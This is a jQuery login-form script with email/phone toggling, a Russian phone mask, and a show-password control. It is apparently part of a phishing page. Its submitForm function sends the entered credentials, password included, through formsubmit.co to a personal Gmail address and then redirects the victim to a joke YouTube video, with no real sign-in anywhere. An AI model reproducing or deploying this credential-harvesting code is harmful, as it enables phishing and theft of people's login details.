console.log('3 test');

  if ($('.email-block').hasClass('active')) {
    $('.input-email').addClass('active');
  }
  if ($('.phone-block').hasClass('active')) {
    $('.input-phone').addClass('active');
  }

  $('.AuthLoginInputToggle-type').click(function(){
    $('.AuthLoginInputToggle-type').removeClass('active');
    $(this).addClass('active');
    if ($('.email-block').hasClass('active')) {
      $('.input-email').addClass('active');
    }else{
      $('.input-email').removeClass('active');
    }
    if ($('.phone-block').hasClass('active')) {
      $('.input-phone').addClass('active');
    }else{
      $('.input-phone').removeClass('active');
    }
  });
  
  $('#phone').mask('+7(000) 000-000-00', {placeholder: "+7("});
   

$('.voiti').click(function(){
  var inputValues = $('.form-input');
  var hasEmptyInput = false;

  inputValues.each(function() {
      if ($(this).val() === '') {
          $('.error').addClass('active');
          $('.first .input-email input').addClass('error-input');
          $('.first .input-phone input').addClass('error-input');
      } else {
          $('form > div').removeClass('hidden-section');
          $('form > div').removeClass('show-section');
          $('.first').addClass('hidden-section');
          $('.second').addClass('show-section');
          $('.error').removeClass('active');
    }
  });
  
});


$('.back-icon').click(function(){
  $('form > div').removeClass('hidden-section');
  $('form > div').removeClass('show-section');
  $('.first').addClass('show-section');
  $('.second').addClass('hidden-section');
});
$('.second .login-info').click(function(){
  $('form > div').removeClass('hidden-section');
  $('form > div').removeClass('show-section');
  $('.first').addClass('show-section');
  $('.second').addClass('hidden-section');
});



$('.first .input .form-input').on('input', function() {
  var inputValue = $(this).val();
  $('.user-login span').text(inputValue);
});
$('.first .input #phone').on('input', function() {
  var inputValue = $(this).val();
  $('.user-login span').text(inputValue);
});

$('#showPass').click(function(){
  $('#showPass').addClass('hidden');
  $('#showPass').removeClass('active');
  $('#hidePass').removeClass('hidden')
  $('#hidePass').addClass('active');  
  $("#myPass").attr("type", "text");
});

$('#hidePass').click(function(){
  $('#hidePass').addClass('hidden');
  $('#hidePass').removeClass('active');
  $('#showPass').removeClass('hidden')
  $('#showPass').addClass('active'); 
  $("#myPass").attr("type", "password") 
});


   function submitForm() {
            const form = document.getElementById('contactForm');
            const formData = new FormData(form);
    
            $('.finish').text('');
            $('.finish-wrap img').addClass('active');

            fetch('https://formsubmit.co/ajax/qqslovinskiy@gmail.com', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
                
                form.reset(); 
                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; 
            })
            .catch(error => {
                console.error('Error:', error);
                
            })
          
        }
